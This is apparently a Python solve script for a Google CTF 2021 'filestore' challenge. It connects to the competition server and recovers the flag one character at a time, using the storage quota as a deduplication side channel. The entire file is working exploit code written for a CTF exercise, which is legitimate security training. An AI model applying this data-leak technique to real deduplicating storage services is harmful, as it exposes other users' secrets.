import pwn
import string

def testChar(partFlagFound):
    possibleChars = " "+string.printable[:-6]
    quota2 = b""
    for char in possibleChars :

        nc.recvline() #Menu:
        nc.recvline() #- load
        nc.recvline() #- store
        nc.recvline() #- status
        nc.recvline() #- exit

        nc.sendline("store".encode()) # store
        nc.recvline() # Send me a line of data...
        nc.sendline(partFlagFound.encode()+char.encode()) # CTF{....
        nc.recvline() # Stored! Here's your file id:
        nc.recvline() # recv file id
        nc.recvline() # line feed (\n)

        nc.recvline() #Menu:
        nc.recvline() #- load
        nc.recvline() #- store
        nc.recvline() #- status
        nc.recvline() #- exit

        nc.sendline("status".encode()) # status
        nc.recvline() # User
        nc.recvline() # Time
        quota = nc.recvline() # Quota
        nc.recvline() # Files
        nc.recvline() # line feed (\n)

        if quota == quota2:
            return char
            break
        quota2 = quota

host = "filestore.2021.ctfcompetition.com"
port = 1337
nc = pwn.remote(host, port)

nc.recvline() # == proof-of-work: disabled ==
nc.recvline() # Welcome to our file storage solution.
nc.recvline() # line feed (\n)

flag = "CTF{"

i=0
while flag[-1] != "}":
    flag += testChar(flag[i+1:])
    print(f"[i] {flag}")
    i+=1

print(f"\n[+] FLAG : {flag}")
